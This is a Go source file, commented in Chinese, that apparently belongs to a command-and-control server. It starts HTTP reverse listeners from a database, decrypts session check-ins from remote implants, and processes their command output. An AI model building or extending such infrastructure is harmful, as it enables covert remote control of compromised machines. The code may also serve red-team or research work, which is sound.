package SessionController

import (
	"Server/Public"
	"github.com/gin-gonic/gin"
	"io"
	"net/http"
)

type Listener struct {
	// 监听器列表
	listenerList []*http.Server
}

var ListenerObj = Listener{make([]*http.Server, 0)}

// 重启所有监听器
func (p Listener) RestartListener() {
	// 关闭所有监听器
	for _, listener := range ListenerObj.listenerList {
		listener.Shutdown(nil)
	}
	ListenerObj.listenerList = []*http.Server{}

	// 开启所有监听器
	listenerInfoList := Public.SqlSelect("select * from ListenerInfo", nil)
	for _, listenerInfo := range listenerInfoList {
		if listenerInfo["protocol"] == "HTTP" && listenerInfo["connectType"] == "反向" {
			HttpReverseListener(listenerInfo)
		}
	}
}

// HTTP 反向监听器
func HttpReverseListener(listenerInfo map[string]string) {
	gin.SetMode(gin.ReleaseMode)
	gin.DefaultWriter = io.Discard
	r := gin.Default()

	r.POST("/*path", func(c *gin.Context) {
		// 解密会话数据
		sessionInfoMap, selfAsmHashList, commandOutputDataList, err := DecryptSessionData(c)
		if err {
			return
		}
		// 处理会话数据
		if sessionInfoMap["sessionType"] == "pending" {
			// 处理待定会话
			ProcessPendingSession(sessionInfoMap, listenerInfo["name"], c)
		} else if sessionInfoMap["sessionType"] == "session" {
			// 处理正式上线会话
			ProcessSession(sessionInfoMap, selfAsmHashList, commandOutputDataList, listenerInfo["name"], c)
		}
	})

	server := http.Server{
		Addr:    ":" + listenerInfo["port"],
		Handler: r,
	}
	go func() {
		server.ListenAndServe()
	}()
	ListenerObj.listenerList = append(ListenerObj.listenerList, &server)
}
